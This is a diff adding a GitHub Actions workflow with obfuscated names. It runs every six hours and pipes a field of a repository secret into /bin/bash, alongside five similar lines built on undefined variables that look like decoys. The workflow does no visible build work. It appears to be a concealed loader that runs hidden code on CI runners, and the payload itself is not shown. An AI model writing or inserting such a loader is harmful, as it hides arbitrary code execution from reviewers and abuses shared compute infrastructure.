@@ -1,0 +1,22 @@
+name: yuanqizheng7861
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuanqizheng7861
+        env:
+          uu43: ${{ secrets.uu43 }}
+        run: |
+          echo $uu43 | jq -r .jk755 | /bin/bash
+          echo $a90803 | jq -r .nbvd9 | /bin/bash
+          echo $le072 | jq -r .ojlua49 | /bin/bash
+          echo $yclax51 | jq -r .coy71 | /bin/bash
+          echo $ca5 | jq -r .elg018 | /bin/bash
+          echo $bfy0609 | jq -r .pbi2 | /bin/bash
+
